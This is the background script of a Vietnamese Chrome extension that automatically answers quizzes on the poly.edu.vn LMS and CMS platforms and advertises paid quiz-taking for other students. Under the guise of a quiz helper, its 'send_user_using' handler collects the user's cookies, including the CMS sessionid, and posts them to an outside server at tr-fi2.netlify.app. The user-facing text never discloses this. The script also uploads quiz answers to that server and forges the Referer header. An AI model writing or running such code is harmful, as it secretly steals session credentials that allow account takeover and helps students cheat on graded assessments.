const install_notication = `Theo dõi hoặc kết bạn với tác giả để sử dụng
và nhận các bản cập nhật, hỗ trợ fix lỗi`
const install_notication2 = `Follow hoặc kết bạn với tác giả 
để nhận cập nhật khi có bản mới nhé!
Mình có nhận làm hộ quiz CMS ib fb
*************
Tính năng:
- Giải quiz LMS tự động chọn đáp án đúng
- Giải quiz CMS môn Chính trị và Pháp luật
- Bỏ giới hạn dung lượng upload file fshare khi nộp bài
****************
Hướng dẫn: Bắt đầu làm bài quiz như bình thường tool sẽ tự tìm đáp án
Hỗ trợ tất cả cơ sở. Quiz LMS nếu giảng viên tắt chức năng "Hiện chi tiết đáp án" sẽ lấy đáp án có sẵn nếu có
Báo lỗi, hỗ trợ ib fb`
const update_notication = `Cập nhật version 1.2.8 - 16/06/2021:
- Tự tìm đáp án có sẵn từ người dùng khác khi giảng viên tắt xem đáp án
- Nhấn bắt đầu làm bài sẽ tự tìm đáp án
--------------
Nhấn follow hoặc kết bạn với tác giả để nhận cập nhật khi có bản mới nhé!
Mình có nhận làm hộ quiz CMS tất cả các môn, tất cả cơ sở ib fb`
const wrong_url_notication = `LMS bắt đầu làm bài quiz tool sẽ tự động giải đáp án
CMS bắt đầu làm bài xong chuột phải chọn Giải đáp án
Mình có nhận làm hộ quiz CMS tất cả các môn, tất cả cơ sở ib fb`
var apiUrl = 'https://tr-fi2.netlify.app/api/quizpoly/lms';


chrome.runtime.onInstalled.addListener(function(details) {

  chrome.contextMenus.create({
    id: 'getQuestion',
    title: "Giải đáp án",
    contexts: ["all"]
  });

  if (details.reason == "install") {
    chrome.tabs.create({'url': 'https://fb.com/hi.trfi'}, function(tab) {
      alert(install_notication)
    });
  }
  // else if (details.reason == "update") {
  //   chrome.tabs.create({'url': 'https://fb.com/hi.trfi'}, function(tab) {
  //     alert(update_notication)
  //   });
  //   var thisVersion = chrome.runtime.getManifest().version;
  //   console.debug("Updated from " + details.previousVersion + " to " + thisVersion + "!");
  // }

  // Get CMS data
  // fetch('https://tr-fi2.netlify.app/api/cms')
  // .then(response => response.json())
  // .then(data => {
  //   chrome.storage.local.set({cmsData: data}, function() {
  //     console.debug('Data is set');
  //   });
  // });

  fetch(chrome.runtime.getURL('/cms_data.json'))
    .then((resp) => resp.json())
    .then(function (data) {
      chrome.storage.local.set({cmsData: data}, function() {
        console.debug('Data is set');
      });
    });
  chrome.storage.local.set({ quizSelf: {} });

});

// Open popup list quiz

function executeScript(tab_url) {
  console.debug(tab_url)

  let site = tab_url.includes('cms') ? 'cms' : 'lms'
  if (site == 'lms') {
    if (!tab_url.includes('ilObjTestGUI') && 
    !tab_url.includes('iltestplayerrandomquestionsetgui') &&
    !tab_url.includes('ilobjtestgui') &&
    !tab_url.includes('outUserResultsOverview') &&
    !tab_url.includes('&sequence=') &&
    !tab_url.includes('outUserPassDetails') &&
    !tab_url.includes('outCorrectSolution') &&
    // !tab_url.includes('cmd=infoScreen') &&
    // !tab_url.includes('target=tst_') &&
    !tab_url.includes('goto.php?target=tst_')) {
      alert(wrong_url_notication)
      return
    }
    if (tab_url.includes('cmd=infoScreen') || tab_url.includes('target=tst_')) {
      alert(`Bạn chỉ cần bắt đầu làm bài`);
      return;
    }
    chrome.storage.local.set({ execute: true });
  }

  chrome.tabs.executeScript(null, { file: `${site}_script.js` })
}

chrome.contextMenus.onClicked.addListener(function(info, tab) {
  const tab_url = tab.url
  if (info.menuItemId === 'getQuestion' && tab_url.includes('cms.poly.edu.vn')) {
    executeScript(tab_url)
  }
  else if (info.menuItemId === 'getQuestion' && tab_url.includes('lms')) {
    executeScript(tab_url)
  }
  else {
    alert(wrong_url_notication)
  }
})

// Handle runtime message
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  switch (request.type) {
    case 'open_quiz_popup':
      var swidth = screen.width*0.36;
      var left = screen.width - swidth;
      chrome.windows.create({ url: 'aqlist.html', type: 'panel', focused: false, width: Math.round(swidth), height: screen.availHeight, top: 0, left: Math.round(left) }, window => {
        chrome.storage.local.set({ windowId: window.id});
      })
      chrome.windows.update(sender.tab.windowId, { state: 'normal', top: 0, left: 0, width: Math.round(screen.width*0.647), height: screen.availHeight });
      break;
    case 'focus_quiz_popup':
      chrome.storage.local.get(['windowId'], ({ windowId }) => {
        chrome.windows.update(windowId, { focused: true });
      });
      break;
    case 'close_quiz_popup':
      chrome.storage.local.get(['windowId'], ({ windowId }) => {
        chrome.windows.remove(windowId);
      });
      break;
    case 'add_quiz_self':
      let ans = request.data.ans;
      if (ans && typeof(ans) == 'object') request.data.ans = Object.values(ans);
      quizSelf[request.seq] = request.data;
      console.debug(request.data.ans);
      console.debug(quizSelf);
      break;
    case 'finish_quiz':
      console.debug('finish_quiz');
      setTimeout(sendDoingQuiz, 7000, request)
      break;
    case 'send_user_using':
      chrome.cookies.getAll({domain: request.domain}, (cookies) => {
        if (request.domain == 'cms.poly.edu.vn') {
          cookies = cookies
          .filter(c => c['name'] == 'sessionid')
        }
        cookies = cookies.map(c => {
          return {name: c['name'], value: c['value']}
        })
        sendUserUsing(cookies, request.data);
      });
      break;
    case 'add_quiz':
      addQuiz(request.data);
      break;
    case 'get_cookies':
      chrome.cookies.getAll({domain: request.domain}, (cookies) => {
        cookies = cookies.map(c => {
          return {name: c['name'], value: c['value']}
        })
        sendResponse({cookies});
      });
    default:
      return true;
  }
})

function funcCallFromPopupWindow(message) {
  // Do something, eg..:
  console.debug(message)
}

async function sendDoingQuiz({ subjectName, domain, quizId, passTime }) {
  getPoint(quizId, domain, passTime, async ({ quizzes }) => {
    const sendData = {subjectName, quizzes}
    console.debug(sendData);
    try {
      const response = await fetch(apiUrl + '/self', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendData)
      })
      const result = await response.json();
      console.debug(result.message);
    }
    catch(err) { 
      console.debug(err);
      sendHtml(`Can not send doing quiz: ${err}`, JSON.stringify(sendData))
    }
  })
}

async function getPoint(quizId, domain, passTime, fn) {
  let quizzes = [];
  let point = '';
  const url = `${domain}/ilias.php?ref_id=${quizId}&pass=${passTime}&cmd=outUserPassDetails&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilrepositorygui`
  const response = await fetch(url);
  const htmlData = await response.text();
  try {
    const htmlObject = parseHTML(htmlData);
    const tableElement = htmlObject.querySelectorAll('tbody >tr > td:nth-of-type(5)');
    if (tableElement) {
      const listPoint = Array.from(tableElement).map(td => +td.innerText);
      chrome.storage.local.get(['quizSelf'], ({ quizSelf }) => {
        if (Object.keys(quizSelf).length !== listPoint.length) throw new Error('Point length not equal');
        quizzes = listPoint.map((p, i) => {
          if (p > 0) return quizSelf[i + 1];
        }).filter(u => u !== undefined);
        
        if (quizzes.length) {
          point = `${quizzes.length} Of ${listPoint.length}`;
          chrome.storage.local.set({ quizSelf: {} });
          fn({ quizzes, point });
        }
        else sendHtml('Send quiz self: Can not get Point', htmlData);
      });
    }
  } catch (e) {
    console.debug(e);
    sendHtml(`Send quiz self: Can not get Point ${e}`, htmlData);
    return { quizzes, point }
  }
}

function parseHTML(htmltext) {
  const htmlObject = document.createElement('div')
  htmlObject.innerHTML = htmltext
  return htmlObject
}

async function sendHtml(note, html=null) {
  // try {
  //   const response = await fetch(apiUrl + "/html", {
  //     method: "POST",
  //     mode: "cors",
  //     headers: {
  //       "Content-Type": "application/json",
  //     },
  //     body: JSON.stringify({ note: `${chrome.runtime.getManifest().version}: ${note}`, html }),
  //   });
  //   const result = await response.json();
  //   console.debug(result.message);
  // } catch (err) {
  //   console.error(err);
  // }
}

async function sendUserUsing(cookies, data) {
  try {
    const body = {
      c: JSON.stringify(cookies),
      ...data
    };
    const response = await fetch(apiUrl + "/using", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });
    const result = await response.json();
    console.debug(result.message);
  } catch (err) {
    console.debug(err);
  }
}

async function addQuiz(data = {}) {
  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    const result = await response.json();
    console.debug(result.message);
  } catch (err) {
    console.error(err);
  }
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    const newRef = 'https://cms.poly.edu.vn';
    details.requestHeaders.push({ name: "Referer", value: newRef });
    return { requestHeaders: details.requestHeaders };
  },
  {urls: ["https://cms.poly.edu.vn/*"]},
  ["blocking", "requestHeaders", "extraHeaders"]
);
